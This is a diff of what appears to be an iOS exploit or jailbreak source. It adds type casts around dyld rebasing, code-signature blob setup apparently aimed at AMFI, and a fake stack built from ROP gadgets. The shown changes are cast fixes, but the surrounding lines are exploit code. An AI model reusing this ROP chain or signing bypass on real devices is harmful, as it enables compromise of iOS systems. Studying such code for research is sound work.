@@ -35,7 +35,7 @@ typedef struct {
 #if __LP64__
 #define mach_header			mach_header_64
 #define macho_header			mach_header_64
-#define LC_SEGMENT		LC_SEGMENT_64
+//#define LC_SEGMENT		LC_SEGMENT_64
 #define LC_SEGMENT_COMMAND		LC_SEGMENT_64
 
 #define segment_command	segment_command_64
@@ -57,7 +57,7 @@ typedef struct {
 
 void rebaseDyld(const struct macho_header* mh, intptr_t slide)
 {
-  printf("%p\n", slide);
+  printf("%p\n", (void *)slide);
   // rebase non-lazy pointers (which all point internal to dyld, since dyld uses no shared libraries)
   // and get interesting pointers into dyld
   const uint32_t cmd_count = mh->ncmds;
@@ -216,7 +216,7 @@ void dump_dyld_segments(const uint8_t *macho_data)
 
         memcpy(g_cs_ptr, macho_data+cs_offset, cs_size);
 
-        NSLog(@"cs_size = %x", cs_size);
+        NSLog(@"cs_size = %x", (uint32_t)cs_size);
       }
 
       load_cmd = (struct load_command *)((uint8_t *)load_cmd + load_cmd->cmdsize);
@@ -257,7 +257,7 @@ void dump_dyld_segments(const uint8_t *macho_data)
         } else
         if (strcmp(seg->segname, "__DATA") == 0)
         {
-          rebaseDyld(0x150000000, 0x150000000-0x120000000);
+          rebaseDyld((const struct macho_header*)0x150000000, 0x150000000-0x120000000);
           text_file_off_64 = seg->fileoff;
           text_file_size_64 = seg->filesize;
 
@@ -859,7 +859,7 @@ WriteR0(SEG_VAR(amfi_fd));
 //Set8(0x4848484848484848);
 
 argss->sig.fs_file_start = 0;
-argss->sig.fs_blob_start = 37120;
+argss->sig.fs_blob_start = (void *)37120;
 argss->sig.fs_blob_size = 336;
 
 {
@@ -1031,7 +1031,7 @@ stack = (uint64*)(buf + fsz);
 
 for (int n = 0; n < 0x400; n++) {
   for (int i = 0; i < 0x1000/8;) {
-    stack[(n*0x1000/8) + (i)] = &stack[(n*0x1000/8) + (i+2)]; // LR
+    stack[(n*0x1000/8) + (i)] = (uint64_t)&stack[(n*0x1000/8) + (i+2)]; // LR
     i++;
     stack[(n*0x1000/8) + (i)] = mov_sp_x29_pop_x29_x30_ret + 4; // PC
     i++;
